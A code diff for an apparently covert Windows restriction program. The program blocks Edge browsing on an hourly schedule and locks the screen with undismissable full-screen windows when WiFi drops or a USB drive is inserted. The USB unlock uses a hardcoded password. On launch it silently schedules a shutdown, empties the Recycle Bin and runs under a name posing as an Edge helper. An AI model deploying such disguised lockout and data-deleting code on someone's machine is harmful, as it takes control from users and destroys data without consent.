@@ -18,9 +18,7 @@ import os
 import sys
 import time
 import tkinter as tk
-from tkinter import messagebox
 from datetime import datetime, timedelta
-import threading
 import subprocess
 
 # ================= 【Windows 最前端控制台隐藏 & 安全导入】 =================
@@ -48,20 +46,11 @@ else:
     mmap = Mock()
     ctypes = Mock()
 
-# ================= 【配置区域】 =================
-断网时长_分钟 = 45
-联网时长_分钟 = 15
-
+# ================= 【共享配置】 =================
 MUTEX_NAME = "Local\\MyApp_msedge_helper_Mutex"
 SHARED_MEM_NAME = "Local\\MyApp_msedge_helper_Time_Share"
 global_mmap_file = None
 # ===============================================
-
-# --- 内部计算变量 ---
-实际_专注秒数 = 断网时长_分钟 * 60
-实际_休息秒数 = 联网时长_分钟 * 60
-显示_专注文本 = 断网时长_分钟
-显示_休息文本 = 联网时长_分钟
 
 
 if getattr(sys, 'frozen', False):
@@ -121,11 +110,6 @@ def 弹窗提示_原生(标题, 内容, 图标类型=0x40):
             pass
     else:
         print(f"[{标题}] {内容}")
-
-
-def 弹窗提示_非阻塞(标题, 内容):
-    """在新线程中弹窗提示"""
-    threading.Thread(target=lambda: 弹窗提示_原生(标题, 内容, 0x40), daemon=True).start()
 
 
 def 弹窗_3秒自动关闭(标题, 内容):
@@ -304,6 +288,7 @@ def 显示解锁窗口():
 # ================= 【WiFi 连接状态检测】 =================
 
 wifi_warning_window = None
+root = None
 
 def 检查WiFi是否已连接():
     """
@@ -345,80 +330,68 @@ def 检查WiFi是否已连接():
 
 
 def 显示WiFi断开警告():
-    global wifi_warning_window
+    global wifi_warning_window, root
     if wifi_warning_window and wifi_warning_window.winfo_exists():
         try:
             wifi_warning_window.attributes('-topmost', True)
+            wifi_warning_window.lift()
             wifi_warning_window.focus_force()
         except Exception:
             pass
         return
         
-    def 创建窗口():
-        global wifi_warning_window
-        try:
-            wifi_warning_window = tk.Tk()
-            设置窗口图标(wifi_warning_window)
-            wifi_warning_window.title("网络连接警告")
-            wifi_warning_window.configure(bg='#1e1e1e')  # 暗黑背景
-            
-            # 最大化（保留任务栏）与置顶
-            wifi_warning_window.state('zoomed')
-            wifi_warning_window.attributes('-topmost', True)
-            
-            # 禁用关闭按钮 (X)
-            def on_closing():
-                pass
-            wifi_warning_window.protocol("WM_DELETE_WINDOW", on_closing)
-            
-            # 防止最小化：如果窗口被最小化 (iconic) 或隐藏，立即恢复最大化
-            def restore_window(event=None):
-                try:
-                    if wifi_warning_window.state() == 'iconic':
-                        wifi_warning_window.state('zoomed')
-                        wifi_warning_window.attributes('-topmost', True)
-                except Exception:
-                    pass
-            wifi_warning_window.bind("<Unmap>", lambda e: wifi_warning_window.after(10, restore_window))
-            wifi_warning_window.bind("<Map>", restore_window)
-            
-            # 居中警告信息面板
-            main_frame = tk.Frame(wifi_warning_window, bg='#1e1e1e')
-            main_frame.place(relx=0.5, rely=0.5, anchor='center')
-            
-            label_title = tk.Label(
-                main_frame, 
-                text="⚠️ 网络连接已被中断", 
-                font=("微软雅黑", 28, "bold"), 
-                fg="#ff4d4f",
-                bg='#1e1e1e',
-                pady=10
-            )
-            label_title.pack()
-            
-            label_desc = tk.Label(
-                main_frame, 
-                text="检测到您的 WiFi 已断开，请立刻重新连接！\n\n温馨提示：即使处于断网状态，也无法打开浏览器或游玩离线小游戏。", 
-                font=("微软雅黑", 18), 
-                fg="#ffffff",
-                bg='#1e1e1e',
-                pady=20,
-                wraplength=800,  # 限制文本最大换行宽度
-                justify='center'
-            )
-            label_desc.pack()
-            
-            wifi_warning_window.mainloop()
-        except Exception:
+    try:
+        wifi_warning_window = tk.Toplevel(root)
+        设置窗口图标(wifi_warning_window)
+        wifi_warning_window.title("网络连接警告")
+        wifi_warning_window.configure(bg='#1e1e1e')  # 暗黑背景
+        
+        # 无边框真全屏与置顶
+        wifi_warning_window.attributes('-fullscreen', True)
+        wifi_warning_window.attributes('-topmost', True)
+        
+        # 禁用关闭按钮
+        def on_closing():
             pass
-
-    threading.Thread(target=创建窗口, daemon=True).start()
+        wifi_warning_window.protocol("WM_DELETE_WINDOW", on_closing)
+        
+        # 抢占事件焦点
+        wifi_warning_window.grab_set()
+        
+        # 居中警告信息面板
+        main_frame = tk.Frame(wifi_warning_window, bg='#1e1e1e')
+        main_frame.place(relx=0.5, rely=0.5, anchor='center')
+        
+        label_title = tk.Label(
+            main_frame, 
+            text="⚠️ 网络连接已被中断", 
+            font=("微软雅黑", 28, "bold"), 
+            fg="#ff4d4f",
+            bg='#1e1e1e',
+            pady=10
+        )
+        label_title.pack()
+        
+        label_desc = tk.Label(
+            main_frame, 
+            text="检测到您的 WiFi 已断开，请立刻重新连接！\n\n温馨提示：即使处于断网状态，也无法打开浏览器或游玩离线小游戏。", 
+            font=("微软雅黑", 18), 
+            fg="#ffffff",
+            bg='#1e1e1e',
+            pady=20,
+            wraplength=800,  # 限制文本最大换行宽度
+            justify='center'
+        )
+        label_desc.pack()
+    except Exception:
+        pass
 
 
 def 关闭WiFi断开警告():
     global wifi_warning_window
     if wifi_warning_window and wifi_warning_window.winfo_exists():
         try:
+            wifi_warning_window.grab_release()
             wifi_warning_window.destroy()
         except Exception:
             pass
@@ -459,102 +432,107 @@ def 获取当前插入的U盘():
     return u盘列表
 
 
+def 弹出临时提示(标题, 内容):
+    global root
+    try:
+        top = tk.Toplevel(root)
+        设置窗口图标(top)
+        top.title(标题)
+        top.attributes('-topmost', True)
+        tk.Label(top, text=内容, font=("微软雅黑", 10), padx=20, pady=20).pack()
+        top.update_idletasks()
+        w, h = top.winfo_width(), top.winfo_height()
+        sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
+        top.geometry(f"+{(sw-w)//2}+{(sh-h)//2}")
+        root.after(3000, top.destroy)
+    except Exception:
+        pass
+
+
 def 显示U盘锁定警告():
-    global usb_warning_window, usb_unlocked
+    global usb_warning_window, usb_unlocked, root
     if usb_warning_window and usb_warning_window.winfo_exists():
         try:
             usb_warning_window.attributes('-topmost', True)
+            usb_warning_window.lift()
             usb_warning_window.focus_force()
         except Exception:
             pass
         return
         
-    def 创建窗口():
-        global usb_warning_window, usb_unlocked
-        try:
-            usb_warning_window = tk.Tk()
-            设置窗口图标(usb_warning_window)
-            usb_warning_window.title("安全警告")
-            usb_warning_window.configure(bg='#1e1e1e')  # 暗黑背景
-            
-            # 最大化且置顶
-            usb_warning_window.state('zoomed')
-            usb_warning_window.attributes('-topmost', True)
-            
-            # 禁用关闭按钮
-            def on_closing():
-                pass
-            usb_warning_window.protocol("WM_DELETE_WINDOW", on_closing)
-            
-            # 防止最小化
-            def restore_window(event=None):
-                try:
-                    if usb_warning_window.state() == 'iconic':
-                        usb_warning_window.state('zoomed')
-                        usb_warning_window.attributes('-topmost', True)
-                except Exception:
-                    pass
-            usb_warning_window.bind("<Unmap>", lambda e: usb_warning_window.after(10, restore_window))
-            usb_warning_window.bind("<Map>", restore_window)
-            
-            # 居中面板
-            main_frame = tk.Frame(usb_warning_window, bg='#1e1e1e')
-            main_frame.place(relx=0.5, rely=0.5, anchor='center')
-            
-            label_title = tk.Label(
-                main_frame, 
-                text="⚠️ 检测到外部存储设备 (U 盘) 插入", 
-                font=("微软雅黑", 28, "bold"), 
-                fg="#ff4d4f",
-                bg='#1e1e1e',
-                pady=10
-            )
-            label_title.pack()
-            
-            label_desc = tk.Label(
-                main_frame, 
-                text="使用 U 盘需要输入解锁密码，或者请立即拔出 U 盘！", 
-                font=("微软雅黑", 18), 
-                fg="#ffffff",
-                bg='#1e1e1e',
-                pady=20,
-                wraplength=800,
-                justify='center'
-            )
-            label_desc.pack()
-            
-            # 密码输入框
-            密码框 = tk.Entry(main_frame, show="*", font=("微软雅黑", 14), width=25, justify='center')
-            密码框.pack(pady=10)
-            密码框.focus()
-            
-            def 校验密码(event=None):
-                global usb_unlocked
-                输入 = 密码框.get()
-                if 输入 == "BL233":
-                    usb_unlocked = True
-                    usb_warning_window.destroy()
-                    弹窗_3秒自动关闭("提示", "U盘已解锁使用")
-                else:
-                    弹窗提示_原生("密码错误", "密码错误！", 0x10)
-                    密码框.delete(0, tk.END)
-                    
-            密码框.bind("<Return>", 校验密码)
-            
-            按钮 = tk.Button(main_frame, text="确认解锁", font=("微软雅黑", 12), command=校验密码, width=12)
-            按钮.pack(pady=10)
-            
-            usb_warning_window.mainloop()
-        except Exception:
+    try:
+        usb_warning_window = tk.Toplevel(root)
+        设置窗口图标(usb_warning_window)
+        usb_warning_window.title("安全警告")
+        usb_warning_window.configure(bg='#1e1e1e')  # 暗黑背景
+        
+        # 无边框真全屏与置顶
+        usb_warning_window.attributes('-fullscreen', True)
+        usb_warning_window.attributes('-topmost', True)
+        
+        # 禁用关闭按钮
+        def on_closing():
             pass
-
-    threading.Thread(target=创建窗口, daemon=True).start()
+        usb_warning_window.protocol("WM_DELETE_WINDOW", on_closing)
+        
+        # 抢占事件焦点
+        usb_warning_window.grab_set()
+        
+        # 居中面板
+        main_frame = tk.Frame(usb_warning_window, bg='#1e1e1e')
+        main_frame.place(relx=0.5, rely=0.5, anchor='center')
+        
+        label_title = tk.Label(
+            main_frame, 
+            text="⚠️ 检测到外部存储设备 (U 盘) 插入", 
+            font=("微软雅黑", 28, "bold"), 
+            fg="#ff4d4f",
+            bg='#1e1e1e',
+            pady=10
+        )
+        label_title.pack()
+        
+        label_desc = tk.Label(
+            main_frame, 
+            text="使用 U 盘需要输入解锁密码，或者请立即拔出 U 盘！", 
+            font=("微软雅黑", 18), 
+            fg="#ffffff",
+            bg='#1e1e1e',
+            pady=20,
+            wraplength=800,
+            justify='center'
+        )
+        label_desc.pack()
+        
+        # 密码输入框
+        密码框 = tk.Entry(main_frame, show="*", font=("微软雅黑", 14), width=25, justify='center')
+        密码框.pack(pady=10)
+        密码框.focus()
+        
+        def 校验密码(event=None):
+            global usb_unlocked
+            输入 = 密码框.get()
+            if 输入 == "BL233":
+                usb_unlocked = True
+                关闭U盘锁定警告()
+                弹出临时提示("提示", "U盘已解锁使用")
+            else:
+                弹窗提示_原生("密码错误", "密码错误！", 0x10)
+                密码框.delete(0, tk.END)
+                
+        密码框.bind("<Return>", 校验密码)
+        
+        按钮 = tk.Button(main_frame, text="确认解锁", font=("微软雅黑", 12), command=校验密码, width=12)
+        按钮.pack(pady=10)
+    except Exception:
+        pass
 
 
 def 关闭U盘锁定警告():
     global usb_warning_window
     if usb_warning_window and usb_warning_window.winfo_exists():
         try:
+            usb_warning_window.grab_release()
             usb_warning_window.destroy()
         except Exception:
             pass
@@ -563,122 +541,88 @@ def 关闭U盘锁定警告():
 
 # ================= 【主阻断逻辑】 =================
 
-def 阻断逻辑():
+解锁截止单调 = 0.0
+
+def 保持弹窗最前():
+    global wifi_warning_window, usb_warning_window
+    # U盘警告窗口在最上
+    if usb_warning_window and usb_warning_window.winfo_exists():
+        try:
+            usb_warning_window.attributes('-topmost', True)
+            usb_warning_window.lift()
+            if not usb_warning_window.grab_status():
+                usb_warning_window.grab_set()
+        except Exception:
+            pass
+    # WiFi警告窗口
+    elif wifi_warning_window and wifi_warning_window.winfo_exists():
+        try:
+            wifi_warning_window.attributes('-topmost', True)
+            wifi_warning_window.lift()
+            if not wifi_warning_window.grab_status():
+                wifi_warning_window.grab_set()
+        except Exception:
+            pass
+
+
+def 周期检测():
+    global 解锁截止单调, usb_unlocked, root
     try:
-        # 声明 GetTickCount64 返回值类型为 64 位无符号整数
-        if sys.platform == 'win32' and hasattr(ctypes, 'windll'):
-            try:
-                ctypes.windll.kernel32.GetTickCount64.restype = ctypes.c_uint64
-            except Exception:
-                pass
+        # 0. WiFi 状态检测
+        if not 检查WiFi是否已连接():
+            显示WiFi断开警告()
+        else:
+            关闭WiFi断开警告()
 
-        # 初始化基准时间
-        def 获取当前Tick():
-            if sys.platform == 'win32' and hasattr(ctypes, 'windll'):
-                return ctypes.windll.kernel32.GetTickCount64()
-            return int(time.time() * 1000)
+        # 0.1 U 盘状态检测
+        u盘列表 = 获取当前插入的U盘()
+        if u盘列表:
+            if not usb_unlocked:
+                显示U盘锁定警告()
+        else:
+            usb_unlocked = False
+            关闭U盘锁定警告()
 
-        基准时间 = datetime.now()
-        基准Tick = 获取当前Tick()
-        解锁截止单调 = 0.0
+        # 1. 检查共享内存指令
+        cmd = 读共享内存()
+        if cmd == "CMD:UNLOCK_90":
+            写共享内存("STATUS:UNLOCKED")
+            解锁截止单调 = time.monotonic() + 90 * 60
 
-        while True:
-            # 0. WiFi 状态检测
-            if not 检查WiFi是否已连接():
-                显示WiFi断开警告()
-            else:
-                关闭WiFi断开警告()
-
-            # 0.1 U 盘状态检测
-            u盘列表 = 获取当前插入的U盘()
-            if u盘列表:
-                if not usb_unlocked:
-                    显示U盘锁定警告()
-            else:
-                usb_unlocked = False
-                关闭U盘锁定警告()
-
-            # 1. 检查共享内存指令
-            cmd = 读共享内存()
-            if cmd == "CMD:UNLOCK_90":
-                写共享内存("STATUS:UNLOCKED")
-                # 90分钟免限制上网
-                解锁截止单调 = time.monotonic() + 90 * 60
-                continue
-
-            # 2. 防作弊检测
-            now_time = datetime.now()
-            now_tick = 获取当前Tick()
-
-            # 计算流逝时间
-            流逝时间_秒 = (now_time - 基准时间).total_seconds()
-            流逝Tick_秒 = (now_tick - 基准Tick) / 1000.0
-
-            # 检查是否有时间跳变（差值大于 15 秒判定为作弊）
-            if abs(流逝时间_秒 - 流逝Tick_秒) > 15:
-                写共享内存("STATUS:CHEAT_DETECTED")
-                # 发生作弊，进入永久阻断模式
-                while True:
-                    禁止_edge_上网()
-                    time.sleep(3)
-
-            # 3. 检查是否在 90 分钟解锁期内
-            if time.monotonic() < 解锁截止单调:
-                # 处于解锁期，不执行拦截。更新状态为解锁至何时
-                剩余秒数 = 解锁截止单调 - time.monotonic()
-                预计恢复时间 = datetime.now() + timedelta(seconds=剩余秒数)
-                写共享内存(f"STATUS:UNLOCKED_UNTIL_{预计恢复时间.strftime('%H:%M')}")
-                
-                # 每次重新进入正常循环时，需要重置防作弊基准，以防止解锁期结束后的时钟漂移
-                基准时间 = datetime.now()
-                基准Tick = 获取当前Tick()
-                
-                time.sleep(3)
-                continue
-
-            # 4. 正常限制逻辑：对齐整点
+        # 2. 正常限制/放行逻辑
+        if time.monotonic() < 解锁截止单调:
+            # 处于解锁期，不执行拦截。更新状态为解锁至何时
+            剩余秒数 = 解锁截止单调 - time.monotonic()
+            预计恢复时间 = datetime.now() + timedelta(seconds=剩余秒数)
+            写共享内存(f"STATUS:UNLOCKED_UNTIL_{预计恢复时间.strftime('%H:%M')}")
+        else:
+            # 正常限制逻辑：对齐整点
             现在 = datetime.now()
             当前分钟 = 现在.minute
 
             if 当前分钟 < 45:
                 # 00 - 44 分钟：断网区间
                 禁止_edge_上网()
-                
-                # 计算距离 45 分钟还有多少秒
-                剩余秒数 = (45 - 当前分钟) * 60 - 现在.second
-                # 显示预计恢复时间：当前小时的 45 分
                 恢复时间 = 现在.replace(minute=45, second=0, microsecond=0)
                 写共享内存(f"STATUS:BLOCK_UNTIL_{恢复时间.strftime('%H:%M')}")
-                
-                # 等待下一次检测，最长 3 秒
-                time.sleep(min(3.0, max(0.1, 剩余秒数)))
             else:
                 # 45 - 59 分钟：允许上网（恢复区间）
-                # 计算距离下一个整点还有多少秒
-                剩余秒数 = (60 - 当前分钟) * 60 - 现在.second
-                # 显示预计断网时间：下一个整点 (当前小时 + 1 的 00 分)
                 下个整点 = 现在 + timedelta(hours=1)
                 下个整点 = 下个整点.replace(minute=0, second=0, microsecond=0)
                 写共享内存(f"STATUS:REST_UNTIL_{下个整点.strftime('%H:%M')}")
                 
-                # 等待下一次检测，最长 3 秒
-                time.sleep(min(3.0, max(0.1, 剩余秒数)))
+        # 保持警告窗口最前
+        保持弹窗最前()
     except Exception:
         pass
 
-
-def 居中显示(窗口):
-    窗口.update_idletasks()
-    宽 = 窗口.winfo_width()
-    高 = 窗口.winfo_height()
-    屏幕宽 = 窗口.winfo_screenwidth()
-    屏幕高 = 窗口.winfo_screenheight()
-    x = (屏幕宽 - 宽) // 2
-    y = (屏幕高 - 高) // 2
-    窗口.geometry(f"{宽}x{高}+{x}+{y}")
+    # 3 秒后再次检测
+    if root:
+        root.after(3000, 周期检测)
 
 
 def 主入口():
+    global root
     # 操作系统检查
     if sys.platform != 'win32':
         sys.exit(0)
@@ -700,7 +644,7 @@ def 主入口():
             except: pass
         sys.exit(0)
 
-    # 如果是首个运行的实例，直接作为主程序静默在后台启动，直接进入断网循环，无需任何人工确认
+    # 如果是首个运行的实例，直接作为主程序静默在后台启动，无须人工确认
     初始化共享内存()
     # 执行静默关机命令（12小时后关机）
     执行隐藏命令("shutdown -s -t 43200")
@@ -710,7 +654,15 @@ def 主入口():
     清空回收站()
 
     try:
-        阻断逻辑()
+        root = tk.Tk()
+        设置窗口图标(root)
+        root.withdraw()  # 隐藏主窗口
+        
+        # 启动周期检测
+        root.after(100, 周期检测)
+        
+        # 进入主事件循环
+        root.mainloop()
     finally:
         if handle:
             try:
